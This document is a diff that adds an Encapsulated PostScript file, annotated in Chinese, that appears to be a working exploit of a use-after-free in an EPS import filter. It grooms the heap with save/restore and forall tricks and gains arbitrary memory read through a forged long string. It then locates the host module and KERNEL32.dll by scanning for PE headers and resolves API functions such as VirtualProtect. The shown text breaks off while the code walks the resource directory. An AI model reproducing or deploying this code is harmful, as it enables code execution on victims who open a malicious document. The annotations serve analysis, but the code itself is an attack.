@@ -1,0 +1,1099 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 600 600
+/Times-Roman findfont globaldict begin 
+/l0 10 def l0 scalefont setfont newpath 
+/l1 600 def 
+4 l1 moveto 
+/l2 l1 def 
+/l3 {/l4 exch def /l2 l2 l0 sub def 10 l2 moveto l4 show } bind def 
+
+/combine_array 
+{ 
+    /l7 exch def 
+    /l8 exch def 
+    /l9 l8 length l7 length add string def 
+    l9 0 l8 putinterval 
+    l9 l8 length l7 putinterval 
+    l9                                      %% 合并两个数组
+} bind def 
+/l10 
+{
+    /l11 exch def 
+    l11 10 lt 
+    {                                       %% 如果小于10，则会加0x30(48)
+        48 l11 add                          %% 0, 1, 2, 3, 4, 5, 6, 7, 8, 9
+    }                                       %% 48('0'), 49, 50, 51, 52, 53, 54, 55, 56, 57('9')
+    { 
+        l11 10 sub 65 add                   %% 大于10，减10  加0x41(65)
+    } ifelse                                %% 10, 11, 12, 13, 14, 15, 16...
+} bind def                                  %% 65('A'), 66, 67, 68, 69, 70...
+
+/int_to_strhex
+{ 
+    /l13 exch def 
+    /l9 8 string def 
+    /l15 l13 255 and def                    %% and 0xFF 取低8位
+    l9 7 l15 15 and l10 put                 %% and 0x0F 取低4位
+    l9 6 l15 -4 bitshift 15 and l10 put     %% and 0xF0 取前4位
+    /l16 l13 -8 bitshift 255 and def        %% 取第二个八位
+    l9 5 l16 15 and l10 put 
+    l9 4 l16 -4 bitshift 15 and l10 put 
+    /l17 l13 -16 bitshift 255 and def 
+    l9 3 l17 15 and l10 put 
+    l9 2 l17 -4 bitshift 15 and l10 put 
+    /l18 l13 -24 bitshift 255 and def 
+    l9 1 l18 15 and l10 put 
+    l9 0 l18 -4 bitshift 15 and l10 put     %% 十六进制(数据)转换成字符串.  int_to_str  和 get_dword 对应
+    l9                                      %% 如0x12345678 转换 12345678字符串
+} bind def          
+
+/my_add 
+{ 
+    dup -16 bitshift                        %% 向右移动16位，即除以2的16次方，除以65536
+    /l20 exch def                           %% 获取数据前16位    参数二高16位
+    65535 and                               %% 等价于: & 0xFF
+    /l21 exch def                           %% 获取数据低16位    参数二低16位
+    dup -16 bitshift                        %% 第一个参数
+    /l22 exch def                           %% 获取数据前16位    参数一高16位
+    65535 and                               %% 等价于: & 0xFF
+    dup                                     %% 获取数据低16位 再复制一下
+    /l23 exch def 
+    l21 add 65535 and                       %% 参数二低16位 加 参数一低16位  再 & 0xFF(不进位)
+    l22 l20 add                             %% 参数二高16位 加 参数一高16位
+    l23 l21 add                             %% 参数二低16位 加 参数一低16位  
+    -16 bitshift add                        %% 上面和的结果 向右移动16位，保留进位的值，然后和高16位相加
+    16 bitshift or                          %% 上面结果 向左移动16位，和低16位的和 与
+} bind def                                  %% 功能和add下相似
+
+/my_sub 
+{ 
+    dup -16 bitshift /l20 exch def          %% 参数二， 向右移动16位 得到高16位(32平台)
+    65535 and /l21 exch def                 %% 参数二，& 0xFFFF  得到低16位
+    dup -16 bitshift /l22 exch def          %% 参数一， 向右移动16位，得到高16位
+    65535 and dup /l23 exch def             %% 参数一，& 0xFFFF  得到低16位
+    l21 sub 65535 and                       %% 参数一低16位 减 参数二低16位  然后 & 0xFFFF
+    l22 l20 sub                             %% 参数一高16位 减 参数二高16位 
+    l23 l21 sub 0 lt {1}{0} ifelse          %% 参数一低16位 减 参数二低16位 的值是否小于0  负值则会前16位减1
+    sub 16 bitshift                         %%  
+    or                                      %% 模拟 减法
+} bind def 
+
+/get_val {
+    /l30 exch def                           %% 数组
+    /l31 exch def                           %% 索引
+    l30 l31 get                             取值
+} bind def
+
+/get_word
+{ 
+    /l30 exch def                           %% 数组
+    /l31 exch def                           %% 索引
+    l30 l31 get 
+    l30 l31 1 my_add get                    %% 索引+1 取值   
+    8 bitshift                              %% 左移8位
+    or                                      %% 提取word值,如:2, <23456789> ——> 35175(0x8967)
+} bind def 
+
+/get_dword                                 %% 字面数据转化为对应的数据 get_dword
+{ 
+    /l30 exch def                           %% 第二个参数 数组
+    /l31 exch def                           %% 第一个参数 整数 index
+    l31 -24 bitshift 0 eq                   %% 参数一 右移24位 判断是否为0,也就说必须小于0x800000(8388608)
+    { 
+        l30 l31 get                         %% 使用参数一作为索引:arg0_array[index]
+        l30 l31 1 add get                   %% arg0_array[index+1]       向左移动8位，刚好一个字节。
+        8 bitshift or                       %% arg0_array[index] | ((arg0_array[index+1]) << 8)
+        l30 l31 2 add get                   %% arg0_array[index+2]  向左移动16位
+        16 bitshift or 
+        l30 l31 3 add get                   %% arg0_array[index+3]  向左移动24位。
+        24 bitshift or                      %% 功能就是把一个数组的数据(一个字节)组成变成整数(dword),eg:
+    }                                       %% index = 1, [0 31 2 3 4] ==> 0x403021f (十六进制好表示) 
+    {                                       %% 0  <1234567890> ==>  0x‭78563412‬
+        l30 l31 get                       
+        l30 l31 1 my_add get                %% l19类似于add 
+        8 bitshift or 
+        l30 l31 2 my_add get 
+        16 bitshift or 
+        l30 l31 3 my_add get 
+        24 bitshift or 
+    } ifelse 
+} bind def 
+
+/get_qword                    
+{                                           %% 字面值转化为对应的数据。
+    /l30 exch def                           %% 数组arg0_array
+    /l31 exch def                           %% 索引index
+    l30 l31 4 my_add get                    %% arg0_array[index+4]
+    l30 l31 5 my_add get                    %% arg0_array[index+5]
+    8 bitshift or 
+    l30 l31 6 my_add get 
+    16 bitshift or 
+    l30 l31 7 my_add get 
+    24 bitshift or 
+    l30 l31 get 
+    l30 l31 1 my_add get 
+    8 bitshift or 
+    l30 l31 2 my_add get 
+    16 bitshift or                          %%  例如0 (12345678) 输出：
+    l30 l31 3 my_add get                    %%  0x34333231, 0x38373635
+    24 bitshift or                      
+} bind def 
+
+/put_data_to_array                          %% 把参数二 放入以参数一位索引的参数三数组内;
+{                                           
+    /l30 exch def                           %% 参数三： 数组;
+    /l13 exch def                           %% 参数二：将放入的数据;
+    /l31 exch def                           %% 参数一： 索引;
+    l31 -24 bitshift 0 eq 
+    { 
+        l30 l31 l13 255 and put 
+        l30 l31 1 add l13 -8 bitshift 255 and put 
+        l30 l31 2 add l13 -16 bitshift 255 and put 
+        l30 l31 3 add l13 -24 bitshift 255 and put 
+    }
+    { 
+        l30 l31 l13 255 and put 
+        l30 l31 1 my_add l13 -8 bitshift 255 and put 
+        l30 l31 2 my_add l13 -16 bitshift 255 and put 
+        l30 l31 3 my_add l13 -24 bitshift 255 and put 
+    } ifelse 
+} bind def 
+
+/put_2data_to_array 
+{                                           %% 把参数二，参数三，以参数一为索引，放入参数四的数组内
+    /l30 exch def                                       %% 数组
+    /l47 exch def                                       %% 数据一
+    /l48 exch def                                       %% 数据二
+    /l31 exch def                                       %% 索引
+    l31 -24 bitshift 0 eq                               %% 参数一 向右移动24位 判断是否为0
+    { 
+        l30 l31 l47 255 and put                         %% 参数三 & 0xFF 放入 参数一 为索引的 数组 参数四
+        l30 l31 1 add l47 -8 bitshift 255 and put 
+        l30 l31 2 add l47 -16 bitshift 255 and put 
+        l30 l31 3 add l47 -24 bitshift 255 and put 
+        l30 l31 4 add l48 255 and put 
+        l30 l31 5 add l48 -8 bitshift 255 and put 
+        l30 l31 6 add l48 -16 bitshift 255 and put 
+        l30 l31 7 add l48 -24 bitshift 255 and put      
+    }
+    { 
+        l30 l31 l47 255 and put 
+        l30 l31 1 my_add l47 -8 bitshift 255 and put       %% 难道索引过大，使用另一种加法？
+        l30 l31 2 my_add l47 -16 bitshift 255 and put 
+        l30 l31 3 my_add l47 -24 bitshift 255 and put 
+        l30 l31 4 my_add l48 255 and put 
+        l30 l31 5 my_add l48 -8 bitshift 255 and put 
+        l30 l31 6 my_add l48 -16 bitshift 255 and put 
+        l30 l31 7 my_add l48 -24 bitshift 255 and put 
+    } ifelse 
+} bind def 
+
+%% ============================================================================
+/l50 { 1000 { l52 length string dup 0 l52 putinterval } repeat } bind def 
+/l51 
+{ 
+    /l52 <0800000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF55000000FFFFFFFF5800000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF000003000000000000000000000000008800000000000000900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000E0000000000000000000000005000000E800000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF05000000FFFFFFFFE001000000000000400100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000900100000000000000000000FFFFFF7F980100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFF7F00000000000500000000000000000000000000003801000000000000000500000000000000000000000000005802000000000000000500000000000000000000000000000003000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF600200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B00200000000000000000000FFFFFF7FB80200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001234567878563412FFFFFF7F00000000080300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000580300000000000000000000FFFFFF7F600300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001234567878563412FFFFFF7F00000000> def 
+    /l53 ( /l54 exch def l57 l55 l54 put /l55 l55 1 add def ) def 
+    /l56 ( l62 restore l50 l61 0 l60 put ) def 
+    /l57 72 array def 
+    /l55 1 def 
+    /l59 ( l56 cvx exec ) cvx def
+    /l60 ( l53 cvx exec ) cvx def 
+
+    /l61 1 array def 
+    l61 0 l59 put 
+    /l62 save def 
+    /l63 71 string def 
+    
+    100 { 71 string pop } repeat 
+
+    l63 l61 forall 
+    
+    /l64 l57 56 get def                 %% 0x38        执行序列0x2d
+    /l65 l57 57 get def                 %% 0x39
+    /l66 l57 58 get def                 %% 0x3A
+    /l67 l57 59 get def                 %% 0x3B
+    /l68 l64 l65 8 bitshift my_add l66 16 bitshift my_add l67 24 bitshift my_add def 
+    /l69 l57 60 get def                 %% 0x3c
+    /l70 l57 61 get def                 %% 0x3d
+    /l71 l57 62 get def                 %% 0x3e
+    /l72 l57 63 get def                 %% 0x3f
+    /l73 l69 l70 8 bitshift my_add l71 16 bitshift my_add l72 24 bitshift my_add def 
+    /l74 l57 64 get def                 %% 0x40
+    /l75 l57 65 get def                 %% 0x41
+    /l76 l57 66 get def                 %% 0x42   得到整数值的序列：0x[0x42][0x41][0x40]
+    /l77 l74 l75 8 bitshift my_add l76 16 bitshift my_add def 
+    /l78 l57 8 get def 
+    /l79 l57 9 get def 
+    /l80 l57 10 get def 
+    /l81 l57 11 get def 
+    /l82 l78 l79 8 bitshift my_add l80 16 bitshift my_add l81 24 bitshift my_add def 
+    /l83 l57 12 get def 
+    /l84 l57 13 get def 
+    /l85 l57 14 get def 
+    /l86 l57 15 get def 
+    /l87 l83 l84 8 bitshift my_add l85 16 bitshift my_add l86 24 bitshift my_add def 
+    l52 length 1 add l77 eq 
+    { 
+        /l88 0 def 1000 { /l90 exch def l90 type /stringtype eq { l88 0 eq{ 0 l73 l68 0 l90 get_dword my_add l90 put_2data_to_array 80 l73 l68 80 l90 get_dword my_add 1992 my_sub l90 put_2data_to_array 128 l73 l68 128 l90 get_dword my_add l90 put_2data_to_array 136 l73 l68 136 l90 get_dword my_add l90 put_2data_to_array 208 l73 l68 208 l90 get_dword my_add l90 put_2data_to_array 224 l73 l68 224 l90 get_dword my_add l90 put_2data_to_array 304 l73 l68 304 l90 get_dword my_add l90 put_2data_to_array 312 l73 l68 312 l90 get_dword my_add l90 put_2data_to_array 384 l73 l68 384 l90 get_dword my_add l90 put_2data_to_array 400 l73 l68 400 l90 get_dword my_add l90 put_2data_to_array 468 l73 l90 put_data_to_array 496 l73 l68 496 l90 get_dword my_add l90 put_2data_to_array 520 l73 l68 520 l90 get_dword my_add l90 put_2data_to_array 544 l73 l68 544 l90 get_dword my_add l90 put_2data_to_array 600 l73 l68 600 l90 get_dword my_add l90 put_2data_to_array 672 l73 l68 672 l90 get_dword my_add l90 put_2data_to_array 688 l73 l68 688 l90 get_dword my_add l90 put_2data_to_array 768 l73 l68 768 l90 get_dword my_add l90 put_2data_to_array 840 l73 l68 840 l90 get_dword my_add l90 put_2data_to_array 856 l73 l68 856 l90 get_dword my_add l90 put_2data_to_array /l92 l90 def /l88 1 def }{ l90 0 l92 putinterval } ifelse } if } repeat 1 l73 l68 l87 l82
+    }
+    { 0 0 0 0 0 } ifelse 
+} bind def 
+l51 
+/l95 exch def                   %% l95 = 0      xp 32位环境下.
+/l96 exch def                   %% l96 = 0
+/l97 exch def                   %% l97 = 0 
+/l98 exch def                   %% l98 = 0
+/l99 exch def                   %% l99 = 0
+
+%%==============================================第二阶段===========================
+
+/l100 { 1000 { l102 length string dup 0 l102 putinterval } repeat } bind def 
+/l101 
+{ 
+    /l102 exch def 
+    /l103 0 def 
+    /l53 ( /l54 exch def l57 l55 l54 put /l55 l55 1 add def ) def  
+    /l56 ( l62 restore l100 l61 0 l60 put ) def     %% 恢复之前保存的ps状态,同时把fol循环函数替换掉.
+    /l57 68 array def 
+    /l55 1 def 
+    /l59 ( l56 cvx exec ) cvx def                   %% forall 循环第一次执行
+    /l60 ( l53 cvx exec ) cvx def                   %% forall 之后执行的函数,提取uaf后的内存。
+    /l61 1 array def 
+    100                                             %% 执行序列:0x1f
+    {
+        /l55 1 def 
+        l61 0 l59 put 
+        /l62 save def 
+        /l63 39 string def                          %% 申请39(0x27)大小的字符串是有原因的，申请0x27的时候，
+        l63 l61 forall                              %% 引擎会申请0x28大小的内存，而0x28大小刚好字符串对象结构的大小.
+
+        /l116 l57 32 get def                        %% l63 被重新利用,覆盖的数据，提取其中数据的偏移 +0x20
+        /l117 l57 33 get def                        %% +0x21
+        /l118 l57 34 get def                        %% +0x22
+        /l119 l57 35 get def                        %% +0x23
+        /l120 l116 l117 8 bitshift my_add l118 16 bitshift my_add l119 24 bitshift my_add def 
+        /l74 l57 36 get def                         %% +0x24
+        /l75 l57 37 get def                         %% +0x25
+        /l76 l57 38 get def                         %% +0x26 l177 = 0x0155
+        /l77 l74 l75 8 bitshift my_add l76 16 bitshift my_add def 
+        /l125 l57 4 get def 
+        /l126 l57 5 get def 
+        /l127 l57 6 get def 
+        /l128 l57 7 get def                         %% l129 = 0x0eae540
+        /l129 l125 l126 8 bitshift my_add l127 16 bitshift my_add l128 24 bitshift my_add def  
+%% 通过不断save-restore(其实就一次),重造l63字符串指向的内存区，得到的结构为原始的字符串结构,大小0x28那个:
+%% 00EB4820   4C 3F 8F 00 40 E5 EA 00 00 00 00 00 00 00 00 00 
+%% 00EB4830   00 00 00 00 07 00 00 00 00 00 00 00 00 00 00 00  
+%% 00EB4840   00 18 EB 00 55 01 00                             
+
+        l77 l102 length 1 add eq                    %% l102 length = 0x154  执行序列0x71
+        {
+            /l103 1 def 
+            /l88 0 def 
+            1000                                    %% 把上面循环压栈的1000个元素弹出来.
+            { 
+                /l90 exch def 
+                l90 type /stringtype eq             %% l90 字符串对象,即一个ps_obj,内容为：l136。
+                { 
+                    l88 0 eq 
+                    {                               %% l120 = 0x0eb1800  指向写入到字符串内容l136
+                        0 l120 0 l90 get_dword my_add l90 put_data_to_array 
+                        44 l120 44 l90 get_dword my_add 848 my_sub l90 put_data_to_array  %% +0x2c -0x350
+                        76 l120 76 l90 get_dword my_add l90 put_data_to_array             %% +0x4c
+                        80 l120 80 l90 get_dword my_add l90 put_data_to_array             %% +0x50
+                        120 l120 120 l90 get_dword my_add l90 put_data_to_array           %% +0x78
+                        132 l120 132 l90 get_dword my_add l90 put_data_to_array           %% +0x84
+                        176 l120 176 l90 get_dword my_add l90 put_data_to_array           %% +0xb0
+                        180 l120 180 l90 get_dword my_add l90 put_data_to_array           %% +0xb4
+                        220 l120 220 l90 get_dword my_add l90 put_data_to_array           %% +0xdc
+                        232 l120 232 l90 get_dword my_add l90 put_data_to_array           %% +0xe8
+                        288 l120 288 l90 get_dword my_add l90 put_data_to_array           %% +0x120
+                        /l92 l90 def 
+                        /l88 1 def 
+                    }
+                    { 
+                        l90 0 l92 putinterval       %% 把原始字符感染成构造的字符。
+                    } ifelse 
+                } if                                %% 通过判断返回值，感觉上面内层的repeat并没什么用,
+            } repeat exit                           %% 浪费n多时间,想着构造数据干啥呢,仅仅把1000个元素pop掉.
+        } if 
+    } repeat                                
+    l103                                            %% 返回: 1
+    l120                                            %% 返回: 0x0eb1800  uaf内存块：+0x20
+    l129                                            %% 返回: 0x0eae540  uaf内存块：+0x4
+} bind def 
+
+l99 1 eq { () l3 }                                  %% l99push之前，堆栈数目:0x3e9(1001)
+{
+     /l136 <04000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF3700000030000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000030000000000000000005000000054000000000000000000000000000000000000000000000000000000000000000000000000000000840000000000000004000000880000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFF0400000014010000B8000000000000000000000000000000000000000000000000000000000000000000000000000000E800000000000000FFFFFF7FEC000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFF7F000500000000000000000000B4000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF> def 
+     l136                                           %% len = 0x154(340)
+     l101 
+     /l137 exch def                                 %% 返回: 0x0eae540  uaf内存块+0x4
+     /l138 exch def                                 %% 返回: 0x0eb1800  uaf内存块+0x20
+     /l103 exch def                                 %% 返回: 1
+     l103 1 eq { () l3 }{ quit } ifelse 
+} ifelse 
+
+%%==============================================第三阶段===========================
+
+l99 1 eq                                         
+{
+    /l140 { 500 { l142 length string dup 0 l142 putinterval } repeat } bind def 
+    /l141 { /l142 <FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000550000> def 64 l98 l97 l142 put_2data_to_array /l143 0 def /l144 ( /l145 exch def ) def /l53 ( l62 restore l140 l61 0 l151 put ) def /l56 ( l143 82 eq { l61 0 l60 put } if /l143 l143 1 add def ) def /l59 ( l56 cvx exec ) cvx def /l60 ( l53 cvx exec ) cvx def /l151 ( l144 cvx exec ) cvx def /l61 1 array def l61 0 l59 put /l62 save def 1 string pop /l63 85 array def /l155 100 array def /l156 0 def 100 { /l90 3 array def l155 l156 l90 put /l156 l156 1 add def } repeat l63 l61 forall l145 } bind def 
+    l141 
+
+    /l159 exch def 
+    /l167 l97 752 my_add def 
+    /l168 l98 def 
+    /l169 l97 920 my_add def 
+    /l170 l98 def 
+    /l171 l97 568 my_add def 
+    /l172 l98 def 
+    /l173 l97 592 my_add def 
+    /l174 l98 def 
+}
+{                   %% image 前缀是<< >> 字典，然而当前需要5个参数：整数, 整数, 整数, 数组, 数组.  虽然没什么用.
+    /l175 { 100 { gsave 96 1 4 l179 l180 image grestore } repeat } bind def 
+    /l176 { 500 { l142 length string dup 0 l142 putinterval } repeat } bind def 
+    /l177
+    { 
+        /l142 exch def 
+        /l179 [96 0 0 1 0 0] def 
+        /l180 {l142} def 
+        /l143 0 def 
+        /l144 ( /l145 exch def ) def 
+        /l53 ( l62 restore l176 l175 l61 0 l151 put ) def 
+        /l56 ( l143 52 eq { l61 0 l60 put } if /l143 l143 1 add def ) def 
+        /l59 ( l56 cvx exec ) cvx def 
+        /l60 ( l53 cvx exec ) cvx def 
+        /l151 ( l144 cvx exec ) cvx def 
+        /l61 1 array def 
+        l61 0 l59 put 
+        /l62 save def 
+        /l63 55 array def 
+        l63 l61 forall                      %% 再次使用漏洞，这次基调是数组，当然被重复的也是数组内的元素.
+        l145                                %% 数组内的元素，是一个单独的对象，即：0x10大小那个结构。
+    } bind def 
+    /l193 <FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF7856341200000000020000> def 
+    36 l138 l193 put_data_to_array          %% 把字符串l138 放到数组l193索引0x24(36)。  
+    l193 l177 
+    /l159 exch def                          %% l177 返回值.
+    /l198 l138 336 my_add def               %% +0x150
+    /l199 l138 320 my_add def               %% +0x140
+} ifelse 
+l159 type /arraytype eq { }{ } ifelse       %% l159 数组类型，0索引存储一个字符串类型，大小0x7FFFFFFF.
+/l201 l159 0 get def                        %% l159 size = 0x4, l201 构造的字符串。
+l201 type /stringtype eq { } if 
+
+%%==============================================第四阶段===========================
+
+/l203 
+{ 
+    2147418112 and /l204 exch def           %%  0x7FFF0000 & 
+    {                             
+        l201 l204 get 77 eq                 %% 从l204 地址内取值.  77(0x4d)
+        { 
+            l201 l204 1 my_add get 90 eq                            %% 90(0x5a), 匹配dos头：0x4d5a
+            { 
+                l204 60 my_add l201 get_dword dup 512 lt            %% 60(0x3c) 
+                { 
+                    l204 my_add dup l201 get_val 80 eq              %% 80(0x50),pe头(0x5045)
+                    { 
+                        1 my_add l201 get_val 69 eq { exit } if     %% 69(0x45)
+                    }
+                    { pop } ifelse 
+                }{ pop } ifelse 
+            } if 
+        } if 
+        /l204 l204 65536 sub def            %% - 0x10000
+    } loop 
+    l204                                    %% 获取当前模块地址，并验证pe标记。
+} bind def 
+/l206
+{ 
+    /l30 exch def 
+    65535 not and 
+    /l208 exch def 
+    { 
+        l30 l208 get 77 eq { l30 l208 1 my_add get 90 eq { /l209 l208 60 my_add l30 get_dword 65535 and def l209 512 lt { l209 l208 my_add dup l30 get_val 80 eq { 1 my_add l30 get_val 69 eq { exit } if }{ pop } ifelse }{ pop } ifelse } if } if l208 65536 my_sub /l208 exch def 
+    } loop 
+    l208 
+} bind def 
+/l211 { /l212 exch def l212 -24 bitshift 255 and 128 ge } bind def 
+/l213 { /l212 exch def /l215 128 24 bitshift def /l216 l215 l212 xor def l216 } bind def 
+/l217 { /l212 exch def /l215 128 24 bitshift def /l216 l215 l212 or def l216 } bind def 
+/l221                                                           %% 获取指定模块地址.       
+{
+    /l222 exch def                                              %% 参数二： 字符串, 模块名称(如:KERNEL32.dll);
+    /l204 exch def                                              %% 参数一： 整数， 一个地址(如：当前模块地址);
+    /l224 l204 dup 60 my_add l201 get_dword my_add def          %% 获取pe头.
+    l224 25 my_add l201 get_val dup 01 eq                       %% pe+0x19,OptionHeader.Magic 0x10b  pe32
+    { 
+        pop 
+        /l225 l204 l224 128 my_add l201 get_dword my_add def    %% pe+0x80-->image_dir_entry_import.VA
+        /l226 l224 132 my_add l201 get_dword def                %% pe+0x84-->image_dir_entry_import.size
+    }
+    { 
+        02 eq                                                   %% Magic 0x20b, pe32+   64位
+        { 
+            /l225 l204 l224 144 my_add l201 get_dword my_add def      
+            /l226 l224 148 my_add l201 get_dword def 
+        } if 
+    } ifelse
+    0 0 20 l226                                                 %% for(int x = 0; x < size; x += 0x14)             
+    { 
+        /l229 exch def 
+        /l230 l225 l229 my_add 12 my_add l201 get_dword def     %% +0xc-->import_desc.Name,
+        l230 0 eq { quit } if 
+        l201 l204 l230 my_add 15 getinterval 
+        l222 search 
+        { 
+            length 0 eq { pop pop pop l225 l229 my_add exit } if 
+            pop 
+        } if 
+        pop 
+    } for 
+} bind def 
+
+/l231 
+{ 
+    /l222 exch def 
+    /l233 exch def 
+    /l234 exch def 
+    /l224 l233 dup 60 my_add l234 get_dword 65535 and my_add def 
+    /l236 l224 25 my_add l234 get_val def 
+    l236 01 eq 
+    { 
+        /l225 l233 l224 128 my_add l234 get_dword my_add def 
+        /l226 l224 132 my_add l234 get_dword def
+    }
+    { 
+        l236 02 eq
+        { 
+            /l225 l233 l224 144 my_add l234 get_dword my_add def 
+            /l226 l224 148 my_add l234 get_dword def 
+        } if 
+    } ifelse 
+    0 0 20 l226 
+    { 
+        /l229 exch def 
+        /l230 l225 l229 my_add 12 my_add l234 get_dword def 
+        l230 0 eq { quit } if 
+        l234 l233 l230 my_add 15 getinterval l222 search { length 0 eq { pop pop pop l225 l229 my_add exit } if pop } if pop 
+    } for 
+} bind def 
+/l243                                                       %% 获取指定模块地址
+{ 
+    /l222 exch def                                          %% 第二个参数: 字符串 
+    /l245 exch def                                          %% 第一个参数: 模块地址
+    /l246 l245 l222 l221 def                                %% 得到参数二模块名称的地址
+    /l247 l245 l246 16 my_add l201 get_dword my_add def     
+    /l248 l247 l201 get_dword def 
+    /l249 l248 l203 def 
+    l249 
+} bind def 
+/l250                                                       %% 32位环境，获取函数地址。     
+{ 
+    /l251 exch def                                          %% 参数三： 字符串, 函数名称(如:VirtualProtect);
+    /l222 exch def                                          %% 参数二： 字符串, 模块名称(如:KERNEL32.dll);
+    /l204 exch def                                          %% 参数一： 整数， 一个地址(如：当前模块地址);
+    /l246 l204 l222 l221 def                                %% 获取模块地址。
+    /l255 l246 l201 get_dword l204 my_add def 
+    /l256 0 def 
+    { 
+        /l257 l255 l256 my_add l201 get_dword def 
+        l257 0 eq {0 exit} if 
+        l201 l204 l257 my_add 50 getinterval l251 search { length 2 eq { pop pop l246 16 my_add l201 get_dword l204 my_add l256 my_add l201 get_dword exit } if pop } if 
+        pop 
+        /l256 l256 4 my_add def 
+    } loop 
+} bind def 
+/l259                                       %% 64位环境，获取函数地址。
+{ 
+    /l251 exch def 
+    /l222 exch def 
+    /l233 exch def 
+    /l263 exch def 
+    /l246 l263 l233 l222 l231 def 
+    /l255 l246 l263 get_dword l233 my_add def 
+    /l256 0 def 
+    { 
+        /l257 l255 l256 my_add l263 get_dword def 
+        l257 0 eq {0 exit} if 
+        l263 l233 l257 my_add 50 getinterval l251 search { length 2 eq { pop pop l246 16 my_add l263 get_dword l233 my_add l256 my_add l263 get_qword exit } if pop } if 
+        pop 
+        /l256 l256 8 my_add def
+    } loop 
+} bind def 
+/l269 
+{ 
+    /l251 exch def 
+    /l233 exch def 
+    /l234 exch def 
+    /l224 l233 dup 60 my_add l234 get_dword 65535 and my_add def 
+    /l236 l224 25 my_add l234 get_val def 
+    l236 01 eq 
+    { 
+        /l275 l233 l224 120 my_add l234 get_dword my_add def 
+        /l276 l224 124 my_add l234 get_dword def
+    }
+    { 
+        l236 02 eq 
+        { 
+            /l275 l233 l224 136 my_add l234 get_dword my_add def 
+            /l276 l224 140 my_add l234 get_dword def
+        } if 
+    } ifelse 
+    /l279 l275 28 my_add l263 get_dword l233 my_add def 
+    /l280 l275 32 my_add l263 get_dword l233 my_add def 
+    /l281 l275 24 my_add l263 get_dword def 
+    /l282 0 def 
+    l281
+    { 
+        /l257 l280 l282 my_add l263 get_dword def 
+        /l284 l279 l282 my_add l263 get_dword def 
+        /l285 l263 l233 l257 my_add 16 getinterval def 
+        l285 l251 search { l233 l284 my_add exit } if 
+        pop 
+        /l282 l282 4 add def 
+    } repeat 
+} bind def 
+l99 1 eq 
+{                                           %% 64位环境
+    /l287 l159 1 get def 
+    l287 type /stringtype eq { } if { l95 l201 get_qword } stopped { (stopped: /) $error /l289 get 100 string cvs combine_array l3 } if /l290 exch def /l291 exch def l290 l201 get_qword /l292 exch def /l293 exch def /l294 0 def /l295 l293 def l292 l211 { /l294 0 l217 def /l297 l292 l213 def l167 l293 0 l217 l201 put_2data_to_array }{ /l297 l292 def l167 l293 0 l201 put_2data_to_array } ifelse l297 l287 l206 /l299 exch def /l246 l287 l299 (KERNEL32.dll) l231 def /l247 l299 l246 16 my_add l287 get_dword my_add def l247 l287 get_qword /l302 exch def /l303 exch def /l304 0 def /l305 l303 def l302 l211 { /l304 0 l217 def /l307 l302 l213 def l169 l303 0 l217 l201 put_2data_to_array }{ /l307 l302 def l169 l303 0 l201 put_2data_to_array } ifelse /l309 l159 2 get def l309 type /stringtype eq { } if l307 l309 l206 /l311 exch def 
+}
+{                                           %% 32位环境
+    /l312 l137 l201 get_dword def           %% l312 = 0x0eb4820
+    /l313 l312 l201 get_dword def           %% l313 = 0x008f3f4c  字符串0x28结构的第一个元素：free_proc。
+    /l314 l313 l203 def                     %% l314 值是多少？ = 0x8f0000  当前epsimp32的基址。
+    /l315 l314 (KERNEL32.dll) l243 def      %% 得到kernel32的基址。
+} ifelse
+
+%%==============================================第五阶段===========================
+
+/l316 
+{ 
+    /l204 exch def 
+    /l224 l204 dup 60 my_add l201 get_dword my_add def          %% pe头
+    l224 25 my_add l201 get_val dup 01 eq                       %% pe+0x19,OptionHeader.Magic 0x10b  pe32 
+    { 
+        pop 
+        /l319 l204 l224 136 my_add l201 get_dword my_add def    %% 136(0x88) Resource directory
+        /l320 l224 140 my_add l201 get_dword def                %% Resource directory size
+    }
+    { 
+        02 eq 
+        { 
+            /l319 l204 l224 152 my_add l201 get_dword my_add def 
+            /l320 l224 156 my_add l201 get_dword def 
+        } if 
+    } ifelse 
+    /l323 l319 12 my_add l201 get_word def 
+    /l324 l319 14 my_add l201 get_word def 
+    /l325 l319 16 my_add def 
+    l324 l323 add 
+    { 
+        /l326 l325 l201 get_dword def 
+        /l327 l325 4 my_add l201 get_dword def 
